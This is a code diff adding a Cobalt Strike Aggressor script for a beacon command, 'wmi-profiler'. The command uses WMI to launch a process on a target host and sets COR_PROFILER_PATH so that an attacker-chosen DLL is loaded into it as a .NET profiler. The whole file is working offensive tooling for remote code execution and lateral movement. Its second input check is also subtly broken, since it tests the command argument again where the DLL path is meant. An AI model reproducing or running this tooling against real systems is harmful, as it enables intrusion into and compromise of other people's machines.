@@ -1,0 +1,48 @@
+
+
+alias wmi-profiler {
+    local('$command $dllpath $barch $dhfs $dhrw $task $argvs');
+    $command = $2;
+    $dllpath = $3;
+
+    if( $command eq $null || $command eq "" ) {
+        berror( $1, "No command given" );
+        return;
+    }
+
+    if( $command eq $null || $command eq "" ) {
+        berror( $1, "No DLL path given" );
+        return;
+    }
+
+    $target = iff(-istrue $4, $4, "127.0.0.1");
+
+    $string1 = "\\\\";
+	$string2 = "\\ROOT\\CIMV2";
+
+    $target2 = $string1.$target.$string2;
+
+    $string3 = "COR_PROFILER_PATH=";
+    $dllpath2 = $string3.$dllpath;
+
+    $barch = barch( $1 );
+    $dhfs = openf( script_resource( "./wmi-profiler. $+ $barch $+ .o") );
+    $dhrw = readb( $dhfs, -1 );
+    closef( $dhfs );
+
+    if( $dhrw eq $null || $dhrw eq "" ) {
+        berror( $1, "Could not read wmi-profiler BOF" );
+        return;
+    }
+
+    $task = "Attempting to load profiler DLL " . $dllpath2 . " into target process on " . $target;
+    btask( $1, $task );
+    $argvs = bof_pack( $1, "ZZZ", $command, $dllpath2, $target2 );
+    beacon_inline_execute( $1, $dhrw, "go", $argvs );
+}
+
+beacon_command_register(
+    "wmi-profiler", 
+    "Execute command and set environment variables to load .NET profile in the process",
+    "Usage: wmi-profiler <command> <DLL path> <optional: target>"
+)
